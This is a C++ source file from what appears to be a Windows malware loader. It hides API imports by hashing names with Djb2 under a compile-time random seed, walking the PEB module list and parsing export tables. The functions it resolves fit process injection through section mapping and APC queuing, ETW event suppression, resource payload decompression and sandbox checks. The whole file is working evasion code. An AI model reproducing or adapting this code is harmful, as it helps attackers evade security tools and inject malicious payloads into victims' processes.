#include "ApiHashing.h"
#include "Structs.h"

#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)       // Calling HashStringDjb2A
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)    // Calling HashStringDjb2W
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);

/* =========================================================================
 *  String hashing using Djb2 algorithm
 * ========================================================================= */

 // Generate a random key at compile time which is used as the initial hash
constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

// Compile-time seed generation for Djb2 hashing, ensuring variability across different compilations
// Modulo 0xFF to ensure the seed fits within a byte, which is sufficient for our hashing needs
constexpr auto DJB2_SEED = RandomCompileTimeSeed() % 0xFF;

extern "C" constexpr DWORD HashStringDjb2A(const char* String) {
    DWORD Hash = DJB2_SEED;
    INT c = 0;

    if (!String) return 0;

    while ((c = *String++)) {
        Hash = ((Hash << 5) + Hash) + c;
    }
    return Hash;
}

extern "C" constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    DWORD Hash = DJB2_SEED;
    INT c = 0;

    if (!String) return 0;

    while ((c = *String++)) {
        if (c >= L'a' && c <= L'z') {
            c -= (L'a' - L'A');
        }
        Hash = ((Hash << 5) + Hash) + c;
    }
    return Hash;
}

/* =========================================================================
 *  C-linkage runtime wrappers for hash functions
 *  Non-constexpr — guaranteed to be emitted as linkable symbols.
 *  Used by .c translation units (e.g. Syscalls.c) that cannot use constexpr.
 * ========================================================================= */

extern "C" DWORD Djb2HashA(const char* String) {
    return HashStringDjb2A(String);
}

extern "C" DWORD Djb2HashW(const wchar_t* String) {
    return HashStringDjb2W(String);
}

/* =========================================================================
 *  Resolving module handle from PEB LDR
 * ========================================================================= */

HMODULE GetModuleHandleH(DWORD dwModuleHash) {
#if defined(_M_X64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pListHead->Flink;

    while (pEntry != pListHead) {
        PLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (pModule->BaseDllName.Buffer) {
            DWORD dwHash = HashStringDjb2W(pModule->BaseDllName.Buffer);
            if (dwHash == dwModuleHash) {
                return (HMODULE)pModule->DllBase;
            }
        }
        pEntry = pEntry->Flink;
    }
    
    return NULL;
}

/* =========================================================================
 *  Resolving function address from module's IMAGE_EXPORT_DIRECTORY table
 * ========================================================================= */

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash) {
    if (!hModule) return NULL;

    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) 
        return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_DATA_DIRECTORY ExportDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (ExportDir.Size == 0 || ExportDir.VirtualAddress == 0)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + ExportDir.VirtualAddress);

    PDWORD pAddrOfFunctions  = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PDWORD pAddrOfNames      = (PDWORD)(pBase + pExport->AddressOfNames);
    PWORD  pAddrOfOrdinals   = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* pFuncName = (char*)(pBase + pAddrOfNames[i]);
		PVOID pFuncAddr = (PVOID)(pBase + pAddrOfFunctions[pAddrOfOrdinals[i]]);
        
        DWORD dwHash = RTIME_HASHA(pFuncName);
        if (dwHash == dwApiHash) {
            return (FARPROC)(pBase + pAddrOfFunctions[pAddrOfOrdinals[i]]);
        }
    }
    
    return NULL;
}

extern "C" {
    DWORD g_Hash_ntdll = 0;
    DWORD g_Hash_kernel32 = 0;
	DWORD g_Hash_kernelbase = 0;
    DWORD g_Hash_ZwCreateSection = 0;
    DWORD g_Hash_ZwMapViewOfSection = 0;
    DWORD g_Hash_ZwUnmapViewOfSection = 0;
    DWORD g_Hash_ZwClose = 0;
    DWORD g_Hash_ZwOpenSection = 0;
    DWORD g_Hash_ZwCreateThreadEx = 0;
    DWORD g_Hash_ZwQueryInformationProcess = 0;
    DWORD g_Hash_ZwWriteVirtualMemory = 0;
    DWORD g_Hash_ZwResumeThread = 0;
    DWORD g_Hash_ZwAllocateVirtualMemory = 0;
    DWORD g_Hash_ZwFlushInstructionCache = 0;
    DWORD g_Hash_ZwProtectVirtualMemory = 0;
    DWORD g_Hash_FindResourceW = 0;
    DWORD g_Hash_LoadResource = 0;
    DWORD g_Hash_LockResource = 0;
    DWORD g_Hash_SizeofResource = 0;
    DWORD g_Hash_VirtualAlloc = 0;
    DWORD g_Hash_VirtualFree = 0;
    DWORD g_Hash_RtlDecompressBuffer = 0;
    DWORD g_Hash_ExitProcess = 0;
    DWORD g_Hash_ZwQueueApcThread = 0;
    DWORD g_Hash_EtwEventWrite    = 0;
    DWORD g_Hash_ExitThread       = 0;
    DWORD g_Hash_CreateSemaphoreA        = 0;
    DWORD g_Hash_CloseHandle             = 0;
    DWORD g_Hash_GetLastError            = 0;
    DWORD g_Hash_GetTickCount64          = 0;
    DWORD g_Hash_GetSystemInfo           = 0;
    DWORD g_Hash_RtlComputeCrc32         = 0;
    DWORD g_Hash_Sleep                   = 0;
    DWORD g_Hash_user32                  = 0;   /* module — wide-char hash, set at runtime */
    DWORD g_Hash_GetSystemMetrics        = 0;
    DWORD g_Hash_advapi32                = 0;   /* module — wide-char hash, set at runtime */
    DWORD g_Hash_RegOpenKeyExA           = 0;
    DWORD g_Hash_RegQueryInfoKeyA        = 0;
    DWORD g_Hash_RegCloseKey             = 0;
} // extern "C"

CTIME_HASHA(ZwCreateSection)           // ZwCreateSection_Rotr32A
CTIME_HASHA(ZwMapViewOfSection)        // ZwMapViewOfSection_Rotr32A
CTIME_HASHA(ZwUnmapViewOfSection)      // ZwUnmapViewOfSection_Rotr32A
CTIME_HASHA(ZwClose)                   // ZwClose_Rotr32A
CTIME_HASHA(ZwOpenSection)             // ZwOpenSection_Rotr32A
CTIME_HASHA(ZwCreateThreadEx)          // ZwCreateThreadEx_Rotr32A
CTIME_HASHA(ZwQueryInformationProcess) // ZwQueryInformationProcess_Rotr32A
CTIME_HASHA(ZwWriteVirtualMemory)      // ZwWriteVirtualMemory_Rotr32A
CTIME_HASHA(ZwResumeThread)            // ZwResumeThread_Rotr32A
CTIME_HASHA(ZwAllocateVirtualMemory)   // ZwAllocateVirtualMemory_Rotr32A
CTIME_HASHA(ZwFlushInstructionCache)   // ZwFlushInstructionCache_Rotr32A
CTIME_HASHA(ZwProtectVirtualMemory)    // ZwProtectVirtualMemory_Rotr32A
CTIME_HASHA(LoadResource)              // LoadResource_Rotr32A
CTIME_HASHA(LockResource)              // LockResource_Rotr32A
CTIME_HASHA(SizeofResource)            // SizeofResource_Rotr32A
CTIME_HASHA(VirtualAlloc)              // VirtualAlloc_Rotr32A
CTIME_HASHA(VirtualFree)               // VirtualFree_Rotr32A
CTIME_HASHA(RtlDecompressBuffer)       // RtlDecompressBuffer_Rotr32A
CTIME_HASHA(ExitProcess)               // ExitProcess_Rotr32A
CTIME_HASHA(FindResourceW)             // FindResourceW_Rotr32A
CTIME_HASHA(ZwQueueApcThread)          // ZwQueueApcThread_Rotr32A
CTIME_HASHA(EtwEventWrite)             // EtwEventWrite_Rotr32A
CTIME_HASHA(ExitThread)                // ExitThread_Rotr32A
CTIME_HASHA(CreateSemaphoreA)          // CreateSemaphoreA_Rotr32A
CTIME_HASHA(CloseHandle)               // CloseHandle_Rotr32A
CTIME_HASHA(GetLastError)              // GetLastError_Rotr32A
CTIME_HASHA(GetTickCount64)            // GetTickCount64_Rotr32A
CTIME_HASHA(GetSystemInfo)             // GetSystemInfo_Rotr32A
CTIME_HASHA(RtlComputeCrc32)           // RtlComputeCrc32_Rotr32A
CTIME_HASHA(Sleep)                     // Sleep_Rotr32A
CTIME_HASHA(GetSystemMetrics)          // GetSystemMetrics_Rotr32A
CTIME_HASHA(RegOpenKeyExA)             // RegOpenKeyExA_Rotr32A
CTIME_HASHA(RegQueryInfoKeyA)          // RegQueryInfoKeyA_Rotr32A
CTIME_HASHA(RegCloseKey)               // RegCloseKey_Rotr32A
void ApiHashing_InitHashes(void) {
    /* Module names use the wide-char hasher — must match GetModuleHandleH's
     * PEB LDR walk which hashes BaseDllName (a UNICODE_STRING). */
    g_Hash_ntdll = HashStringDjb2W(L"ntdll.dll");
    g_Hash_kernel32 = HashStringDjb2W(L"kernel32.dll");
	g_Hash_kernelbase = HashStringDjb2W(L"kernelbase.dll");
    g_Hash_user32 = HashStringDjb2W(L"user32.dll");
    g_Hash_advapi32 = HashStringDjb2W(L"advapi32.dll");
    g_Hash_ZwCreateSection = ZwCreateSection_Rotr32A;
    g_Hash_ZwMapViewOfSection = ZwMapViewOfSection_Rotr32A;
    g_Hash_ZwUnmapViewOfSection = ZwUnmapViewOfSection_Rotr32A;
    g_Hash_ZwClose = ZwClose_Rotr32A;
	g_Hash_ZwOpenSection = ZwOpenSection_Rotr32A;
	g_Hash_ZwCreateThreadEx = ZwCreateThreadEx_Rotr32A;
	g_Hash_ZwQueryInformationProcess = ZwQueryInformationProcess_Rotr32A;
	g_Hash_ZwWriteVirtualMemory = ZwWriteVirtualMemory_Rotr32A;
	g_Hash_ZwResumeThread = ZwResumeThread_Rotr32A;
	g_Hash_ZwAllocateVirtualMemory = ZwAllocateVirtualMemory_Rotr32A;
	g_Hash_ZwFlushInstructionCache = ZwFlushInstructionCache_Rotr32A;
	g_Hash_ZwProtectVirtualMemory = ZwProtectVirtualMemory_Rotr32A;
	g_Hash_LoadResource = LoadResource_Rotr32A;
	g_Hash_LockResource = LockResource_Rotr32A;
	g_Hash_SizeofResource = SizeofResource_Rotr32A;
	g_Hash_VirtualAlloc = VirtualAlloc_Rotr32A;
	g_Hash_VirtualFree = VirtualFree_Rotr32A;
	g_Hash_RtlDecompressBuffer = RtlDecompressBuffer_Rotr32A;
    g_Hash_FindResourceW = FindResourceW_Rotr32A;
    g_Hash_ExitProcess = ExitProcess_Rotr32A;
    g_Hash_ZwQueueApcThread = ZwQueueApcThread_Rotr32A;
    g_Hash_EtwEventWrite    = EtwEventWrite_Rotr32A;
    g_Hash_ExitThread       = ExitThread_Rotr32A;
    g_Hash_CreateSemaphoreA        = CreateSemaphoreA_Rotr32A;
    g_Hash_CloseHandle             = CloseHandle_Rotr32A;
    g_Hash_GetLastError            = GetLastError_Rotr32A;
    g_Hash_GetTickCount64          = GetTickCount64_Rotr32A;
    g_Hash_GetSystemInfo           = GetSystemInfo_Rotr32A;
    g_Hash_RtlComputeCrc32         = RtlComputeCrc32_Rotr32A;
    g_Hash_Sleep                   = Sleep_Rotr32A;
    g_Hash_GetSystemMetrics        = GetSystemMetrics_Rotr32A;
    g_Hash_RegOpenKeyExA           = RegOpenKeyExA_Rotr32A;
    g_Hash_RegQueryInfoKeyA        = RegQueryInfoKeyA_Rotr32A;
    g_Hash_RegCloseKey             = RegCloseKey_Rotr32A;
}